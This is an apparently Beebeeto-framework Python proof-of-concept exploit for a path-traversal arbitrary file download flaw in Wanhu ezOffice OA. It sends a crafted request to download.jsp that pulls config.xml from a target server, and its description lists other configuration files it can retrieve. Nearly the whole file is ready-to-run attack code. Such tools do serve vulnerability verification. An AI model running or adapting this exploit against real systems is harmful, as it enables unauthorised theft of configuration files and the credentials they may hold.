#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0202',
            'name': '万户OA ezOffice /defaultroot/public/jsp/download.jsp 任意文件下载漏洞 Exploit',
            'author': 'le4f',
            'create_date': '2014-12-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [7001],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ezOffice',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['万户OA漏洞', 'ezOffice漏洞', '/defaultroot/public/jsp/download.jsp', 'jsp'],
            'desc': '''
                    万户EzOffice文件下载漏洞，修改FileName参数配合path下载文件
                    参数path=/../时对应/defaultroot/目录，可下载的配置文件包括不限于：
                    mailserver.properties/govexchange.properties/systemMark.properties/config.xml
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-063711',
            ]
        },
    }

    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + ('/defaultroot/public/jsp/download.jsp?FileName=config.xml'
                                                  '&name=veri&path=/../../config/')
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "<EzOffice>" in content and "</EzOffice>" in content and "history.back()" not in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())